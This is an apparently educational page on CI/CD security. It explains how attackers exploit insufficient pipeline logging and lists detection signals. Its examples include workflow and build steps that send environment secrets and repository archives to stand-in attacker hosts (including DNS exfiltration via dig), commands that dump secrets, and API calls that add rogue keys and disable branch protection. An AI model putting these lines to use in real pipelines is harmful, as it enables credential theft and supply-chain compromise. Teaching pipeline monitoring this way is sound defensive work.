# CICD-SEC-10: Insufficient Logging and Visibility - Attack Vectors

## Table of Contents
- [Understanding the Attack Vectors](#understanding-the-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Undetected Pipeline Activity Patterns](#undetected-pipeline-activity-patterns)
- [Chaining Under Cover of Darkness](#chaining-under-cover-of-darkness)

## Understanding the Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the activity below is described so you can instrument your pipeline to detect and investigate it in systems you own or are authorised to test. Unlike other risks, CICD-SEC-10 has no "payload": the attack vector *is* the fact that ordinary pipeline actions go unrecorded and unwatched.

Insufficient Logging and Visibility is unusual among the CI/CD Top 10 because the attacker does not exploit it directly—they **benefit from it passively**. The compromise itself comes from another risk (a poisoned pipeline, a leaked credential, an over-privileged token). What CICD-SEC-10 provides is **cover**: every step the attacker takes generates an event that a well-instrumented pipeline would surface, and in a blind pipeline that event is never generated, never forwarded, never correlated, or never alerted on.

So the right way to read this page is as a catalogue of **attacker activity that proceeds undetected**. For each pattern, the "attack" is the action, and the vulnerability is the silence that follows it. The attacker's goal is always to complete their objective—persistence, secret theft, tampering, exfiltration—**before anyone notices, if anyone ever does**.

### Core Attack Flow

```
1. Enter
   |
   Compromise via another risk (leaked token, poisoned PR, over-scoped account)
2. Act
   |
   Change pipeline config, read secrets, mint tokens, alter artifacts, deploy
3. Blend
   |
   Each action resembles routine automation; no alert distinguishes it
4. Persist / Exfiltrate
   |
   Add identities, leak data from runners, ship a backdoor
5. Cover
   |
   Where logs are mutable or short-lived, edit or wait out the evidence
   =  objective achieved with no detection and little to reconstruct
```

The recurring theme: at every stage there was an event that *could* have been logged and alerted on. The list below walks each stage in detail.

## Undetected Pipeline Activity Patterns

### 1. Pipeline-Definition Changes Go Unrecorded

The pipeline definition (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) *is* executable code. An attacker who edits it can add a step that steals secrets or backdoors the build.

```yaml
# Malicious step slipped into a workflow file
- name: Run tests
  run: |
    npm test
    curl -s -X POST https://collector.attacker.example/x \
      -d "$(env | base64)"        # exfiltrate all pipeline env/secrets
```

**Why it stays hidden**: if changes to workflow/pipeline files are not treated as security-relevant events—logged with the identity that made them and alerted on—this edit looks like any other commit. No one is notified that the *automation itself* changed.

### 2. Secret Access Leaves No Trace

The pipeline's reason to exist is that it holds credentials. An attacker who can run a job, or read the secrets store, harvests them.

```bash
# A job (or an attacker with store access) reads every configured secret
vault kv get -format=json secret/ci/*      # no read-audit -> invisible
printenv | grep -iE 'TOKEN|KEY|SECRET|PASSWORD'
```

**Why it stays hidden**: if the secrets manager and CI platform do not log *secret reads* (only writes, or nothing), the fact that every credential was accessed at once—a glaring anomaly—produces no record and no alert.

### 3. New or Edited Service Accounts and Tokens

For durable access, attackers create their own identities: a new personal access token, a bot/service account, a deploy key, or an OAuth app.

```
# Persistence via a fresh, broadly-scoped token / key
POST /user/keys           { "title": "ci-cache", "key": "ssh-ed25519 ..." }
POST /orgs/acme/actions/secrets   # add attacker-controlled secret
# New service account with repo + deploy scope, named to look routine
```

**Why it stays hidden**: identity creation is exactly the kind of high-risk event that must be alerted on. Without monitoring of new tokens/keys/service accounts, a benign-looking name ("ci-cache", "backup-bot") is enough to hide a permanent backdoor.

### 4. Unusual Builds and Deploys

An attacker triggers a build or deploy that does something outside the norm—deploying an unreviewed branch, targeting a new region, or running a one-off job.

```bash
# Manual deploy of an attacker branch straight to production
gitlab-ci trigger --ref attacker/patch --env production
# Or a workflow_dispatch run that skips review and ships a crafted artifact
```

**Why it stays hidden**: with no baseline of normal deploy behaviour (who, when, which branches, which targets) and no alert on out-of-band deploys, an anomalous release is indistinguishable from the hundreds of legitimate ones.

### 5. Exfiltration from Runners

Build agents routinely execute untrusted code (dependencies, tests, build scripts) and have network access. A job can quietly send source or secrets to attacker infrastructure.

```bash
# Inside a build step: package the repo and secrets, ship them out
tar czf - . | curl -s --data-binary @- https://exfil.attacker.example/u
# DNS-based exfil to dodge egress filtering
for c in $(cat /run/secrets/token | fold -w4); do dig $c.exfil.attacker.example; done
```

**Why it stays hidden**: if runners have no process- or network-egress monitoring, only their console output is visible—and the attacker controls what that prints. Outbound connections to novel destinations generate no signal.

### 6. A Poisoned Dependency or Artifact

The attacker substitutes or backdoors a dependency, a base image, or a published artifact, so malware rides the trusted pipeline downstream.

```bash
# Overwrite an existing tag in the registry with a backdoored image
docker push registry.example/app:1.4.2      # mutable tag silently replaced
# Or publish a typosquatted / version-bumped package the build now pulls
```

**Why it stays hidden**: if the registry does not log pushes, tag mutations, and publish-token use—and nobody compares what was built against what was published—a swapped artifact flows to every consumer as a normal release.

### 7. Off-Hours Activity

Attackers often operate outside the target's working hours to reduce the chance of a human noticing.

```
# 03:14 local time: config change + deploy on a quiet weekend
02:58  branch-protection rule disabled
03:14  workflow file edited
03:20  production deploy triggered
```

**Why it stays hidden**: time-of-day is a powerful signal, but only if you baseline it. Without alerting on off-hours pipeline actions, the quietest, safest window for the attacker is exactly when no one is watching the dashboards.

### 8. Permission and Protection-Rule Changes

To enable their attack, an intruder weakens controls: disabling branch protection, removing required reviews, broadening a role, or turning off a required check.

```
# Loosen the guardrails that would otherwise catch the next step
PATCH /repos/acme/app/branches/main/protection   # required_reviews -> 0
# Grant a service account admin; disable a required status check
```

**Why it stays hidden**: configuration and permission changes in SCM/CI are prime audit events. If they are not logged and alerted on, the attacker quietly dismantles the very controls that protect the pipeline—and then re-enables them afterward to avoid suspicion.

### 9. Fork-PR Workflow Runs

A pull request from an external fork can trigger CI that runs attacker-authored code, sometimes with access to secrets or a privileged runner.

```json
// Malicious PR modifies the test command that CI will execute
"scripts": { "test": "node ./.ci/steal.js && jest" }
// Runs on pull_request_target with repo secrets in scope
```

**Why it stays hidden**: fork-triggered runs are inherently higher risk and deserve their own alerting. Without it, the malicious run sits among ordinary contributor CI, and its secret access and egress look like a normal test job.

### 10. Erasing or Outlasting the Evidence

Where the attacker gains enough access, and logs are mutable or short-lived, they remove or simply wait out the trail.

```
# Mutable, co-located logs invite tampering
DELETE /projects/42/pipelines/1337        # remove the incriminating run
# Or: do nothing — ephemeral runner is destroyed, CI logs rotate in days
```

**Why it stays hidden**: logs that live in the same system the attacker controls, or that are retained only briefly, cannot be trusted as evidence. Tamper-resistant, off-host, long-retention logging is what denies this final move.

## Chaining Under Cover of Darkness

The danger compounds when several unmonitored actions form a single operation that no one sees end to end:

```
Leaked CI token (unmonitored use)      -> clone private repos, read config
        +
Edit workflow file (no config alert)   -> add a secret-exfil step
        +
Runner egress (no network visibility)  -> secrets shipped to attacker host
        +
New deploy key (no identity alert)     -> durable, quiet re-entry
        =  full pipeline compromise, discovered — if ever — by an outsider
```

Another common chain that stays invisible without correlation:

```
Disable branch protection (no audit alert)
        -> push a backdoored build script straight to main
        -> artifact overwritten in registry (no push/tag-mutation log)
        -> off-hours production deploy (no baseline, no alert)
        -> re-enable branch protection to hide the change
```

In both chains, every arrow is an event that centralised, correlated, alerted logging would have surfaced. The attack succeeds precisely because the events were never joined into a story anyone was watching.

## Detection Signals a Blind Pipeline Misses

| Attacker action | Event that should fire | Missed when… |
|-----------------|------------------------|--------------|
| Edit pipeline/workflow file | Config-change alert with identity | Workflow files treated as ordinary code, no alert |
| Read all secrets | Secret-read audit + volume anomaly | Secrets manager/CI logs no reads |
| Create token / service account | New-identity alert | Identity events not monitored |
| Deploy off-hours / out-of-band | Baseline-deviation alert | No normal-behaviour baseline |
| Runner calls external host | Egress anomaly on the agent | No runner network/process visibility |
| Overwrite an artifact tag | Registry push / tag-mutation alert | Registry audit logging off |
| Disable branch protection | Protection-rule-change alert | SCM admin events not centralised |

## Key Takeaways

1. **The attack vector is silence**—CICD-SEC-10 is exploited passively; the attacker simply benefits from actions that are never recorded or watched.
2. **Every step leaves a potential signal**—config edits, secret reads, new tokens, unusual deploys, runner egress, and rule changes are all detectable if instrumented.
3. **Blending beats stealthy payloads**—in a high-volume pipeline, looking routine is enough; distinguishing malicious from normal requires a baseline.
4. **Runners are a blind spot**—without process and network monitoring, exfiltration hides inside ordinary builds.
5. **Unwatched, mutable, short-lived logs invite the final move**—the attacker erases or outlasts evidence that was never protected or retained.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build toolchain-wide logging, correlation, and alerting
- **[Code Examples](examples.md)**: Insecure vs. secure audit and alerting configuration
- **[CI/CD Security Track](/learn/cicd)**: Return to the full OWASP CI/CD Top 10
- **[Practice](/practice)**: Test your understanding with hands-on challenges
